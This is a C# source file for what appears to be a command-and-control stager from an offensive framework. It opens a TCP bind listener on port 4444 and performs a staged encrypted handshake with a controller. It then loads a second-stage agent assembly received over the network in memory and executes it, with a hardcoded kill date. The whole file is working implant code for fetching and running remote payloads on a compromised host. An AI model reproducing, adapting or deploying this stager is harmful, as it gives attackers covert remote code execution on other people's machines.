using Shared.Models;
using Shared.Utilities;

using Stager.Comms;
using Stager.Models;

using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using System.Text;

namespace Stager
{
    public class Stager
    {
        static string AgentID;
        static string ParentAgentID;

        static Crypto Crypto;
        static CommModule CommModule;
        static StagerModule StagerModule;
        static byte[] SessionKey;

        static bool Staged = false;

        public delegate void StagerCommand(C2Data C2Data);

        public Stager()
        {
            Execute();
        }

        static void Main(string[] args)
        {
            new Stager();
        }

        public static void Execute()
        {
            AgentID = Utilities.GetRandomString(6);
            Crypto = new Crypto();

            StagerModule = new StagerModule
            {
                Commands = new List<StagerModule.StagerCommand>
                {
                    new StagerModule.StagerCommand
                    {
                        Name = "NewLink",
                        Delegate = HandleNewLink
                    },
                    new StagerModule.StagerCommand
                    {
                        Name = "Stage0Response",
                        Delegate = Stage0Response
                    },
                    new StagerModule.StagerCommand
                    {
                        Name = "Stage1Response",
                        Delegate = Stage1Response
                    },
                    new StagerModule.StagerCommand
                    {
                        Name = "Stage2Response",
                        Delegate = Stage2Response
                    }
                }
            };

            CommModule = new TCPCommModule(BindAddress, BindPort);
            CommModule.Start();

            while (!Staged)
            {
                if (CommModule.RecvData(out AgentMessage Message))
                {
                    C2Data c2Data;

                    if (Message.IV == null)
                    {
                        try
                        {
                            c2Data = Utilities.DeserialiseData<C2Data>(Message.Data);
                        }
                        catch
                        {
                            c2Data = Crypto.Decrypt(Message.Data);
                        }
                    }
                    else
                    {
                        c2Data = Utilities.DecryptData<C2Data>(Message.Data, SessionKey, Message.IV);
                    }

                    var callback = StagerModule.Commands
                        .FirstOrDefault(c => c.Name.Equals(c2Data.Command, StringComparison.OrdinalIgnoreCase))
                        .Delegate;

                    callback?.Invoke(c2Data);
                }
            }
        }

        static void HandleNewLink(C2Data C2Data)
        {
            ParentAgentID = Encoding.UTF8.GetString(C2Data.Data);
        }

        static void SendStage0()
        {
            var c2Data = Utilities.SerialiseData(
                new C2Data
                {
                    Module = "Core",
                    Command = "Stage0Request",
                    Data = Encoding.UTF8.GetBytes(Crypto.PublicKey)
                });

            CommModule.SendData(
                new AgentMessage
                {
                    AgentID = AgentID,
                    Data = c2Data
                });
        }

        static void Stage0Response(C2Data C2Data)
        {
            var serverKey = Encoding.UTF8.GetString(C2Data.Data);

            Crypto.ImportServerKey(serverKey);

            var data = Crypto.Encrypt(new C2Data
            {
                Module = "Core",
                Command = "Stage1Request"
            });

            CommModule.SendData(new AgentMessage
            {
                AgentID = AgentID,
                Data = data
            });
        }

        static void Stage1Response(C2Data C2Data)
        {
            SessionKey = new byte[32];
            var challenge = new byte[8];

            Buffer.BlockCopy(C2Data.Data, 0, SessionKey, 0, 32);
            Buffer.BlockCopy(C2Data.Data, 32, challenge, 0, 8);

            var data = Utilities.EncryptData(new C2Data
            {
                Module = "Core",
                Command = "Stage2Request",
                Data = challenge
            },
            SessionKey, out byte[] iv);

            CommModule.SendData(new AgentMessage
            {
                AgentID = AgentID,
                Data = data,
                IV = iv
            });
        }

        static void Stage2Response(C2Data C2Data)
        {
            CommModule.Stop();
            Staged = true;

            var asm = Assembly.Load(C2Data.Data);

            asm.GetType("Agent.Stage").GetMethod("TCPEntry").Invoke(null, new object[]
            {
                AgentID,
                ParentAgentID,
                SessionKey,
                KillDate,
                BindAddress,
                BindPort
            });
        }

        static string BindAddress
        {
            get { return "0.0.0.0"; }
        }

        static int BindPort
        {
            get { return 4444; }
        }

        static DateTime KillDate
        {
            get { return DateTime.Parse("01/01/2030 00:00:01"); }
        }
    }
}